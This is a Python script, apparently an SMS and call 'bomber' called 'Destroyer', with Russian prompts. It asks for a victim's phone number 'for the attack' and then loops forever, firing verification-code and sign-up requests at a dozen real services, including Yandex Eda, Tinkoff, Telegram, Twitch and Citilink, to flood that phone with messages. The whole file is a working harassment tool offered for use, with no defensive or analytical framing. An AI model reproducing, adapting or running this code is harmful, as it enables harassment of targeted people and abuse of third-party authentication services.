import os
os.system("clear")
import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style
from termcolor import colored
banner = colored("""
______          _
|  _  \        | |
| | | |___  ___| |_ _ __ ___  _   _  ___ _ __
| | | / _ \/ __| __| '__/ _ \| | | |/ _ \ '__|
| |/ /  __/\__ \ |_| | | (_) | |_| |  __/ |
|___/ \___||___/\__|_|  \___/ \__, |\___|_|
                               __/ |
                              |___/
                 creators: @sherlockh0lms
		
""", "green")

print(banner)
_phone =  input('Введите номер без «+» для атаки:')

if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'
	try:
		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
		print( Fore . GREEN + '[+] Eda.Yandex отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')

	try:
		requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
		print( Fore . GREEN + '[+] findclone звонок отправлен!')
	except:
		print( Fore . RED + '[-] Не отправлено!')

	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'phone': _phone})
		print( Fore . GREEN + '[+] ICQ отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')
	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print( Fore . GREEN + '[+] Youla отправлено!')
	except:
		print(Fore . RED + '[-] Не отправлено!')
	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print( Fore . GREEN + '[+] Tinkoff отправлено!')
	except:
		print(Fore . RED + '[-] Не отправлено!')

	try:
		requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
		print( Fore . GREEN + '[+] Twitch отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')
	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print( Fore . GREEN + '[+] ICQ отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')

	try:
		requests.post('https://my.telegram.org/auth/send_password',data={'phone': _phone})
		print( Fore . GREEN + '[+] ICQ отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')

	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print( Fore . GREEN + '[+] Sunlight отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')
	
	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print( Fore . GREEN +  '[+] BelkaCar отправлено!')
	except:
		print(Fore . RED + '[-] Не отправлено!')
	
	try:
		requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
		print( Fore . GREEN + '[+] Sberbank отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')

	try:
		requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
		print( Fore . GREEN + '[+] Citilink отправлено!')
	except:
		print( Fore . RED + '[-] Не отправлено!')

	try:
		requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
		print( Fore . GREEN + '[+] MultiPlex отправлено!')
	except:
		print( Fore . RED + '[-] MultiPlex не отправлено!')

	try:
		iteration += 1
		print(('{} круг пройден.').format(iteration))
	except:
		break
